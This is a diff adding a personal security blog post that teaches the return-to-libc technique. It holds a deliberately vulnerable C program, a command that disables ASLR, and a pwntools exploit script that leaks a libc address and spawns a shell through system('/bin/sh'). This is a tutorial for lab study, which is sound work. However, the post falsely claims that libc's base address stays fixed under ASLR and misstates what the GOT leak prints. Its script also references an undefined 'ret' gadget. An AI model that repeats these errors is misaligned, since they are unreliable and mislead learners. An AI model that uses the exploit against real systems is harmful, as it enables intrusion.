@@ -1,0 +1,141 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>ret2libc</title><meta name="description" content="This is Ischyros blog where he posts cyber security topics and sheets"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/ISC.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Binary Exploitation SeriesIntroductionWelcome to the fascinating world of binary exploitation, where we delve into the intricate art of manipulating computer programs to gain unauthorized access, uncover vulnerabilities, and expand our understanding of software security. In this blog post, we’ll embark on a journey into the technique known as “return to .."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Ischyr's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">ret2libc</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Binary-Exploitation-Series"><span class="toc-text">Binary Exploitation Series</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How-does-the-leak-work"><span class="toc-text">How does the leak work</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Padding"><span class="toc-text">Finding the Padding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-the-Information"><span class="toc-text">Using the Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Find-a-rdi-gadget"><span class="toc-text">Find a rdi gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Putting-it-Together"><span class="toc-text">Putting it Together</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Explanation"><span class="toc-text">Explanation</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Pwn"><i class="tag post-item-tag">Pwn</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">ret2libc</h1><time class="has-text-grey" datetime="2023-06-01T15:12:03.000Z">2023-06-01</time><article class="mt-2 post-content"><img src="/2023/06/01/ret2libc/avatar.png" class="">
+
+<h1 id="Binary-Exploitation-Series"><a href="#Binary-Exploitation-Series" class="headerlink" title="Binary Exploitation Series"></a>Binary Exploitation Series</h1><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Welcome to the fascinating world of binary exploitation, where we delve into the intricate art of manipulating computer programs to gain unauthorized access, uncover vulnerabilities, and expand our understanding of software security. In this blog post, we’ll embark on a journey into the technique known as “<strong>return to libc</strong>,” a classic method employed by exploit developers to bypass security mechanisms and gain control of a vulnerable program.</p>
+<p>As technology advances, so do the complexities and challenges associated with securing software systems. To ensure robustness, developers implement various defense mechanisms, such as address space layout randomization (<strong>ASLR</strong>), stack canaries, and non-executable stack (<strong>NX</strong>). However, even the most fortified applications can sometimes possess vulnerabilities that clever attackers can exploit.</p>
+<p>At its core, “<strong>return to libc</strong>“ is a technique used to bypass these security measures by manipulating the program’s control flow and leveraging existing functions within the C library (libc) to achieve arbitrary code execution. This technique relies on the fact that the C library is loaded into the memory space of every executable, making it a valuable resource for attackers seeking to execute code in the context of the exploited program.</p>
+<p>The beauty of <strong>return to libc</strong> lies in its ability to evade the security mechanisms mentioned earlier. ASLR, for example, randomizes the memory locations of key program components, making it harder for attackers to predict addresses accurately. However, the C library’s base address remains constant across different runs of the same program, allowing us to locate and utilize its functions reliably.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc      *&#x2F;
+&#x2F;* Disable ASLR: echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space     *&#x2F;
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int vuln() &#123;
+    char buf[80];
+    int r;
+    r &#x3D; read(0, buf, 400);
+    printf(&quot;\nRead %d bytes. buf is %s\n&quot;, r, buf);
+    puts(&quot;No shell for you :(&quot;);
+    return 0;
+&#125;
+
+int main(int argc, char *argv[]) &#123;
+    printf(&quot;Try to exec &#x2F;bin&#x2F;sh&quot;);
+    vuln();
+    return 0;
+&#125;</code></pre>
+
+<p>Exploiting “<strong>return to libc</strong>“ allows an attacker to achieve various malicious objectives. Here are a few examples:</p>
+<ul>
+<li>Execute Arbitrary Shell Commands: By redirecting the control flow to the <code>system()</code> function from the C library, an attacker can execute arbitrary shell commands within the context of the exploited program. This provides them with unauthorized access and control over the system, enabling them to perform actions like modifying files, stealing data, or even launching further attacks.</li>
+<li>Privilege Escalation: If the exploited program runs with elevated privileges, such as running as a privileged user or setuid binary, an attacker can leverage “return to libc” to escalate their privileges. By executing functions like <code>setuid()</code> or <code>execve()</code> from the C library, the attacker can gain higher privileges, enabling them to perform actions that would otherwise be restricted.</li>
+<li>Bypass Security Mechanisms: “Return to libc” can be used to bypass various security mechanisms implemented by the operating system or the compiler. For example, if the program is protected with address space layout randomization (ASLR), which randomizes the memory addresses, an attacker can still determine the address of the C library functions since they are loaded at a predictable base address. Similarly, stack canaries, which aim to detect stack-based buffer overflows, can be bypassed by avoiding the overwrite of the canary value and instead redirecting the control flow to the C library functions.</li>
+</ul>
+<p>Steps in order to achieve a full <strong>return to libc</strong> chain payload:</p>
+<ul>
+<li>the padding until we begin to overwrite the <strong>RIP</strong> ( instruction pointer )</li>
+<li>a <strong>pop rdi</strong> gadget that allows you to pop a value from the stack into the <code>rdi</code> register, which is commonly used for passing the first argument to functions in the x86-64 calling convention. You can search for such gadgets using tools like ROPgadget or by analyzing the binary with tools like objdump or Ghidra.</li>
+<li>Locate the <code>puts@plt</code> entry: The <code>puts@plt</code> entry is the address of the PLT (Procedure Linkage Table) entry for the <code>puts()</code> function. The PLT is a mechanism used for dynamic function resolution in the binary. You can find the address of <code>puts@plt</code> by examining the binary with tools like objdump or Ghidra.</li>
+<li>Locate the <code>puts@got</code> entry: The <code>puts@got</code> entry is the Global Offset Table (GOT) entry for the <code>puts()</code> function. The GOT stores the actual addresses of dynamically linked functions. You can find the address of <code>puts@got</code> by examining the binary with tools like objdump or Ghidra.</li>
+<li>Execute the payload: Send the payload to the vulnerable program, triggering the exploitation process. The payload should cause the program to execute the <code>pop rdi</code> gadget, which will load the <code>puts@got</code> address into <code>rdi</code>, and then call <code>puts@plt</code> to print the leaked address.</li>
+<li>Extract the leaked libc address: Once the program is executed, it will print the leaked address of the <code>puts()</code> function from the GOT. This address can be used to calculate the base address of the loaded libc library by subtracting the offset of <code>puts()</code> in libc. With the libc base address, you can find other libc functions for further exploitation.</li>
+</ul>
+<h3 id="How-does-the-leak-work"><a href="#How-does-the-leak-work" class="headerlink" title="How does the leak work"></a>How does the leak work</h3><p>The leak works by taking advantage of the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) entries in the binary, along with a <code>pop rdi</code> gadget, to obtain the address of the <code>puts()</code> function from the libc library.</p>
+<ol>
+<li>GOT Entry for <code>puts()</code>: The GOT is a table that holds the addresses of dynamically linked functions. When a function from an external library, such as <code>puts()</code>, is called, the program resolves the address from the GOT. Initially, the GOT entry for <code>puts()</code> contains the address of the corresponding entry in the PLT.</li>
+<li>PLT Entry for <code>puts()</code>: The Procedure Linkage Table (PLT) is a mechanism used for dynamic function resolution. The PLT entry for <code>puts()</code> is a small piece of code responsible for looking up and resolving the actual address of the <code>puts()</code> function in the libc library.</li>
+<li><code>pop rdi</code> gadget: A <code>pop rdi</code> gadget is a sequence of instructions in the binary that pops a value from the stack into the <code>rdi</code> register. The <code>rdi</code> register is commonly used for passing the first argument to functions in the x86-64 calling convention.</li>
+<li>Crafting the Payload: The payload is crafted by constructing a sequence of addresses and instructions. It typically starts with the address of the <code>pop rdi</code> gadget, followed by the address of the <code>puts@got</code> entry, and finally, the address of the <code>puts@plt</code> entry.</li>
+<li>Execution of the Payload: When the vulnerable program executes the crafted payload, it first encounters the <code>pop rdi</code> gadget. This instruction pops the next value from the stack into the <code>rdi</code> register, which is the address of the <code>puts@got</code> entry.</li>
+<li>Calling <code>puts@plt</code>: After the <code>pop rdi</code> gadget, the execution flow reaches the address of the <code>puts@plt</code> entry. The code at this address transfers control to the PLT entry for <code>puts()</code>, which resolves and jumps to the actual address of the <code>puts()</code> function in libc.</li>
+<li>Printing the Leaked Address: The <code>puts()</code> function is called with the address of the <code>puts@got</code> entry in the <code>rdi</code> register. Since the <code>puts@got</code> entry initially contains the address of the corresponding PLT entry, <code>puts()</code> will print this address. This address represents the leaked libc address.</li>
+</ol>
+<h3 id="Finding-the-Padding"><a href="#Finding-the-Padding" class="headerlink" title="Finding the Padding"></a>Finding the Padding</h3><p>The fastest way to find the padding is by using <strong>gdb-peda</strong> which haves a function called <strong>pattern create</strong> that will generate a string based on a lenght.<br>After we have created the cyclic pattern we can type <code>r</code> in order to start the program. When the program asks for the user input just paste the pattern and press <strong>ENTER</strong></p>
+<img src="/2023/06/01/ret2libc/17.54.11.png" class="">
+
+<p>We can see that the program crashed at <code>0x00005555555551ac</code> in <strong>vuln()</strong><br>Using the command <code>pattern search</code> , it will search in the registers for the pattern.</p>
+<img src="/2023/06/01/ret2libc/17.54.54.png" class="">
+
+<h3 id="Using-the-Information"><a href="#Using-the-Information" class="headerlink" title="Using the Information"></a>Using the Information</h3><p>Using this information we can see that in order to overwrite the <strong>RSP</strong> register ( stack pointer ) we need to give it <strong>104</strong> random bytes. Knowing this is a 64 bit architecture the offset to the <strong>RIP</strong> should be <strong>RSP+8</strong>.<br>This means that the next 8 bytes after the 104 offset will overwrite the <strong>instruction pointer</strong>.</p>
+<h3 id="Find-a-rdi-gadget"><a href="#Find-a-rdi-gadget" class="headerlink" title="Find a rdi gadget"></a>Find a rdi gadget</h3><p>This process is quiet simple because there are some tools that will automatically find the gadgets for us: <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 ROPGadget.py --binary .&#x2F;vuln </code></pre>
+
+<h3 id="Putting-it-Together"><a href="#Putting-it-Together" class="headerlink" title="Putting it Together"></a>Putting it Together</h3><p>In order to test this we will create a script in python using <strong>pwntools</strong> ( <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/install.html">https://docs.pwntools.com/en/stable/install.html</a> )<br>The pwntools library is a powerful and widely used Python library designed for binary exploitation, particularly in the context of Capture The Flag (CTF) competitions and exploit development. It provides a comprehensive set of tools and utilities to assist in various stages of exploit development, including remote communication, payload generation, and exploitation techniques.</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+#context.log_level&#x3D;&#39;DEBUG&#39;
+
+p &#x3D; process(&quot;.&#x2F;vuln&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;vuln&quot;, checksec&#x3D;False)
+libc &#x3D; elf.libc
+rop &#x3D; ROP(elf)
+
+def start():
+	if not args.REMOTE:
+		return process(&quot;.&#x2F;vuln&quot;)
+	else:
+		return remote(&quot;localhost&quot;, 1337)
+
+p &#x3D; start()
+
+def main():
+
+	global rop
+
+	pop_rdi &#x3D; (rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;]))[0]
+	puts_got &#x3D; elf.got[&#39;puts&#39;]
+	puts_plt &#x3D; elf.plt[&#39;puts&#39;]
+	main &#x3D; elf.symbols[&#39;main&#39;]
+
+	payload &#x3D; b&quot;&quot;
+	payload +&#x3D; b&quot;A&quot;*104
+	payload +&#x3D; p64(pop_rdi)
+	payload +&#x3D; p64(puts_got)
+	payload +&#x3D; p64(puts_plt)
+
+	p.sendline(payload)
+
+	p.recvline()
+	p.recvline()
+
+	leaked_puts &#x3D; u64(p.recvline().strip().ljust(8, &quot;\x00&quot;))
+	log.info(&quot;puts@leak: &quot; + hex(leaked_puts))
+
+	libc.address &#x3D; leaked_puts - libc.symbols[&#39;puts&#39;]
+	system &#x3D; libc.symbols[&#39;system&#39;]
+	bin_sh &#x3D; next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;))
+
+	payload &#x3D; b&quot;&quot;
+	payload +&#x3D; b&quot;A&quot;*104
+	payload +&#x3D; p64(ret)
+	payload +&#x3D; p64(pop_rdi)
+	payload +&#x3D; p64(bin_sh)
+	payload +&#x3D; p64(system)
+
+	p.sendline(payload)
+
+	p.interactive()
+
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+	main()</code></pre>
+
+<h3 id="Explanation"><a href="#Explanation" class="headerlink" title="Explanation"></a>Explanation</h3><ol>
+<li><p>Leak the Address of <code>puts()</code>: The exploit begins by constructing a payload. It starts with a buffer overflow, filling 104 bytes of padding followed by the address of a <code>pop rdi</code> gadget. This gadget will load the next value from the stack into the <code>rdi</code> register. The payload then includes the address of the <code>puts@got</code> entry (the Global Offset Table entry for the <code>puts()</code> function) and the address of the <code>puts@plt</code> entry (the Procedure Linkage Table entry for <code>puts()</code>). This payload is sent to the vulnerable program.</p>
+</li>
+<li><p>Retrieve the Leaked Address: After sending the payload, the program receives three lines of output. The third line contains the leaked address of <code>puts()</code> from the GOT. The code captures this value, converts it to an integer, and calculates the base address of the libc library by subtracting the offset of <code>puts()</code> in libc.</p>
+</li>
+<li><p>Calculate Addresses: Using the leaked libc base address, the exploit computes the addresses of the <code>system()</code> and <code>/bin/sh</code> strings in libc. These addresses are required to execute shell commands.</p>
+</li>
+<li><p>Construct the Final Payload: The payload is constructed similarly to before, with a buffer overflow and padding. It includes a <code>pop rdi</code> gadget, the address of <code>/bin/sh</code>, and the address of <code>system()</code>.</p>
+</li>
+<li><p>Send the Final Payload: The payload is sent to the vulnerable program, which causes it to execute the <code>system(&quot;/bin/sh&quot;)</code> command, providing a shell with escalated privileges.</p>
+</li>
+<li><p>Interactive Shell: Finally, the exploit enters an interactive shell, allowing the user to interact with the compromised system.</p>
+</li>
+</ol>
+<p>In conclusion, “return to libc” exploitation is a powerful technique that allows attackers to leverage the functionality of libc functions to achieve their malicious objectives. By redirecting the control flow to the C library, attackers can execute arbitrary shell commands, escalate privileges, bypass security mechanisms, and even achieve remote code execution.</p>
+<p>Remember, the goal is not only to understand and exploit vulnerabilities but also to contribute to a safer digital landscape. By sharing knowledge, collaborating, and working together, we can collectively raise the bar on software security and protect against potential threats.</p>
+<p>So, let’s continue to learn, innovate, and make a positive impact in the world of cybersecurity. Together, we can build resilient systems and stay one step ahead of those who seek to compromise them.</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/05/29/mgci-ctf-practice/" title="MGCI CTF Practice"><span class="has-text-weight-semibold">Next: MGCI CTF Practice</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
